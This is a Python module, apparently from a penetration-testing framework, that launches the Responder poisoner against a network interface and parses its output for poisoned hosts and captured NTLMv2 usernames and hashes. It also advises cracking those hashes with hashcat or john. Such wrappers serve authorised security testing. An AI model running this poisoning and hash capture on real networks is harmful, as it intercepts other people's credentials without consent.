"""Responder — LLMNR/NBT-NS/mDNS poisoner and credential harvester."""
from __future__ import annotations

import logging
import re

from backend.tools.base import BaseTool, Finding, Severity, ToolCategory, ToolResult

logger = logging.getLogger("nexus.tools.responder")


class ResponderTool(BaseTool):
    name = "responder"
    category = ToolCategory.AUTH
    requires = ["responder"]

    async def run(self, params: dict) -> ToolResult:
        if not self.validate_params(params):
            return ToolResult(success=False, error="Invalid params: 'interface' required.")

        interface: str = params["interface"]
        timeout: int = int(params.get("timeout", 300))
        analyze_only: bool = bool(params.get("analyze_only", False))
        wpad: bool = bool(params.get("wpad", False))

        cmd = ["responder", "-I", interface, "-v"]
        if analyze_only:
            cmd.append("-A")
        if wpad:
            cmd.append("-w")

        import os
        output_file = None
        if self._job_id and self._session_id:
            from backend.config import settings
            output_file = os.path.join(
                settings.data_dir, "sessions", self._session_id, "jobs", f"{self._job_id}.log"
            )

        returncode, raw = await self._execute(cmd, timeout=timeout, output_file=output_file)
        findings = self.parse(raw)
        return ToolResult(success=True, output=raw, findings=findings)

    def parse(self, raw_output: str) -> list[Finding]:
        findings: list[Finding] = []
        seen: set[str] = set()

        # Responder captures: [NTLMv2] Username: DOMAIN\user | Machine: IP | Hash: ...
        ntlm_pattern = re.compile(
            r"\[(?:NTLMv\d+|SMB|HTTP)\]\s+Username:\s+(\S+)\s+\|.*?Machine:\s+(\S+).*?Hash:\s*(\S+)",
            re.IGNORECASE,
        )
        # Simpler hash capture
        hash_pattern = re.compile(
            r"(\w+)\\\s*(\S+?)::(\S+)?:([a-fA-F0-9:]+)", re.IGNORECASE
        )
        # WPAD / poison success
        poison_pattern = re.compile(
            r"\[(?:LLMNR|NBT-NS|mDNS)\]\s+Poisoned answer sent to\s+(\S+)", re.IGNORECASE
        )

        for line in raw_output.splitlines():
            line = line.strip()

            pm = poison_pattern.search(line)
            if pm:
                victim_ip = pm.group(1)
                key = f"poison:{victim_ip}"
                if key not in seen:
                    seen.add(key)
                    findings.append(Finding(
                        title=f"LLMNR/NBT-NS Poison: {victim_ip}",
                        severity=Severity.HIGH,
                        description=(
                            f"Responder successfully poisoned LLMNR/NBT-NS response to {victim_ip}.\n"
                            f"NTLMv2 hash capture may follow."
                        ),
                        affected_asset=victim_ip,
                        evidence=line,
                        remediation="Disable LLMNR and NetBIOS over TCP/IP. Use DNS with strict validation.",
                    ))
                continue

            hm = hash_pattern.search(line)
            if hm:
                domain = hm.group(1)
                username = hm.group(2)
                ntlm_hash = hm.group(4)
                key = f"hash:{domain}:{username}"
                if key not in seen:
                    seen.add(key)
                    findings.append(Finding(
                        title=f"NTLMv2 Hash Captured: {domain}\\{username}",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Responder captured NTLMv2 hash for {domain}\\{username}.\n"
                            f"Hash (first 40 chars): {ntlm_hash[:40]}..."
                        ),
                        affected_asset=f"{domain}\\{username}",
                        evidence=line,
                        remediation=(
                            "Crack hash with hashcat/john. Rotate credentials. "
                            "Disable LLMNR/NBT-NS on all Windows hosts."
                        ),
                    ))

        return findings

    def validate_params(self, params: dict) -> bool:
        return bool(params.get("interface"))
